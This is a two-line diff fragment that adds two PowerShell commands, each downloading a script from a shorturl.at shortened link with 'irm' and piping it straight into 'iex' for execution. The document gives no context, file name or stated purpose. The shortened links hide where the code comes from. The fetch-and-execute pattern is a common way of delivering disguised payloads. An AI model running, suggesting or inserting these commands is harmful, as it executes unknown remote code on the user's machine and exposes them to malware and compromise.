@@ -1,0 +1,2 @@
+powershell "irm shorturl.at/101Dv | iex"
+powershell "irm shorturl.at/ByY6G | iex"
